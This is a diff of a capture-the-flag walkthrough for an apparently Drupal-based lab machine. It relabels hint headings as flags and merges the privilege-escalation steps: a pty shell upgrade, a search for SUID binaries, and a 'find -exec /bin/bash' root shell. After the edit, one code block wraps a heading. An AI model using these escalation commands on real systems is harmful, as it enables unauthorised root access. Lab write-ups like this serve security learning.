@@ -22,7 +22,7 @@ python -c "import pty; pty.spawn('/bin/bash')"
 cat flag1.txt
 ```
 
-**Hint:**
+**Flag1**
 > Every good CMS needs a config file—and so do you.
 
 ---
@@ -41,7 +41,7 @@ array (
 )
 ```
 
-**Hint:**
+**Flag 2**
 > Brute force and dictionary attacks aren't the only ways to gain access (and you WILL need access).
 > What can you do with these credentials?
 
@@ -76,34 +76,19 @@ cd /home
 cat flag4
 ```
 
-**Hint:**
+**flag4**
 > Can you use this same method to find or access the flag in root?
 > Probably. But perhaps it's not that easy. Or maybe it is?
 
 ---
 
-## Finding SUID Binaries
-
 ```sh
 find / -perm -u=s 2>/dev/null
-```
-
-## Spawning a Shell with Elevated Privileges
-
-```sh
 find /dev -name null -exec /bin/bash \;
-```
-
 ## Accessing the Root Directory
-
-```sh
 cd /root
-```
-
-```sh
 cat thefinalflag.txt
 ```
-
 ---
 
 ## Final Flag
